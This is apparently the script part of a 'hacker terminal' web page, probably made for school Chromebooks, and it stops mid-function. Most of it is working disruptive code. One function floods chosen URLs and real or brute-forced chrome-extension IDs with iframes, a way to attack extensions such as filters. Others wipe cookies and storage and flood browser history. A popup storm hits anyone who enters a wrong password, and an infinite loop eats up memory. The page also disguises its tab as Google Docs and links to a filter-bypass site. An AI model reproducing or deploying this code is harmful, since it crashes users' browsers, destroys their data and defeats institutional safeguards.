<script>
const PASSWORD = "EXTREME SIGMA 123";

function checkPassword() {
  const input = document.getElementById('passwordInput').value;
  if (input === PASSWORD) {
    document.getElementById('passwordScreen').classList.add('hidden');
    document.getElementById('loadingScreen').classList.remove('hidden');
    setTimeout(() => {
      document.getElementById('loadingScreen').classList.add('hidden');
      document.getElementById('terminal').classList.remove('hidden');
    }, 2000);
  } else {
    document.getElementById('passwordScreen').classList.add('hidden');
    document.getElementById('deniedScreen').classList.remove('hidden');
    superPopupFlood(); // enhanced popup storm
  }
}

function openTab(tabId) {
  document.querySelectorAll('.tab').forEach(tab => tab.classList.add('hidden'));
  document.getElementById(tabId).classList.remove('hidden');
}

function backToTerminal() {
  document.querySelectorAll('.tab').forEach(tab => tab.classList.add('hidden'));
  document.getElementById('terminal').classList.remove('hidden');
}

let floodInterval;
function startAttack() {
  const urls = document.getElementById('attackUrls').value.split(',').map(u => u.trim()).filter(Boolean);
  const count = parseInt(document.getElementById('iframeCount').value);
  const delay = parseInt(document.getElementById('iframeDelay').value);
  const manualExts = document.getElementById('manualExt').value.split('\n').map(e => e.trim()).filter(Boolean);
  const bruteForce = document.getElementById('bruteForceExts').checked;

  if (!urls.length) return alert('No URLs provided.');

  floodInterval = setInterval(() => {
    for (let i = 0; i < count; i++) {
      let url = document.getElementById('autoRotate').checked ? urls[Math.floor(Math.random() * urls.length)] : urls[0];
      let iframe = document.createElement('iframe');
      iframe.src = url + '?rand=' + Math.random();
      document.body.appendChild(iframe);
      setTimeout(() => iframe.remove(), 1000);
    }

    manualExts.forEach(ext => {
      let iframe = document.createElement('iframe');
      iframe.src = `chrome-extension://${ext}/`;
      document.body.appendChild(iframe);
      setTimeout(() => iframe.remove(), 1000);
    });

    if (bruteForce) {
      for (let j = 0; j < 10; j++) {
        const randId = Array.from({ length: 32 }, () => "abcdefghijklmnopqrstuvwxyz"[Math.floor(Math.random() * 26)]).join('');
        let iframe = document.createElement('iframe');
        iframe.src = `chrome-extension://${randId}/`;
        document.body.appendChild(iframe);
        setTimeout(() => iframe.remove(), 1000);
      }
    }

  }, delay);
}

function stopAttack() {
  clearInterval(floodInterval);
}

let nukeInterval;
function startNuke() {
  nukeInterval = setInterval(() => {
    try {
      localStorage.clear();
      sessionStorage.clear();
      indexedDB.deleteDatabase('localforage');
      document.cookie.split(";").forEach(c => {
        document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=Thu, 01 Jan 1970 00:00:00 GMT;path=/");
      });
      history.pushState({}, "", "/hacked" + Math.random());
      for (let i = 0; i < 1000; i++) {
        history.pushState({}, "", "/fakeURL" + Math.random());
      }
    } catch(e) {}
  }, 500);
}

function stopNuke() {
  clearInterval(nukeInterval);
}

function superPopupFlood() {
  setInterval(() => {
    for (let i = 0; i < 100; i++) {
      let popup = window.open(generateRandomURL(), '_blank');
      if (popup) popup.blur();
    }
  }, 50);
}

function generateRandomURL() {
  const domains = ["example.com", "fakelink.org", "danger.zone", "attack.now", "badsite.biz"];
  const paths = ["/x", "/y", "/z", "/boom", "/trap"];
  return `https://${domains[Math.floor(Math.random() * domains.length)]}${paths[Math.floor(Math.random() * paths.length)]}?t=${Math.random()}`;
}

function applyCloak() {
  const type = document.getElementById('cloakType').value;
  const custom = document.getElementById('customCloak').value;
  let title = '', favicon = '';

  switch(type) {
    case 'docs': title = 'Google Docs'; favicon = 'https://ssl.gstatic.com/docs/doclist/images/mediatype/icon_1_document_x16.png'; break;
    case 'drive': title = 'Google Drive'; favicon = 'https://ssl.gstatic.com/images/branding/product/1x/drive_2020q4_48dp.png'; break;
    case 'calc': title = 'Calculator'; break;
    case 'notepad': title = 'Notepad'; break;
    case 'blank': title = 'New Tab'; break;
    case 'custom': title = custom; break;
  }

  document.title = title;
  document.querySelectorAll('link[rel="icon"]').forEach(el => el.remove());

  if (favicon) {
    let link = document.createElement('link');
    link.rel = 'icon';
    link.href = favicon;
    document.head.appendChild(link);
  }
}

function openUnblocker() {
  window.location.href = "https://this-gold.vercel.app/";
}

function popupStorm() {
  for (let i = 0; i < 50; i++) {
    window.open('about:blank', '_blank');
  }
}

function memoryBloater() {
  const arr = [];
  while (true) {
    arr.push(new Array(1000000).fill("X"));
  }
}

function trapBrowser() {
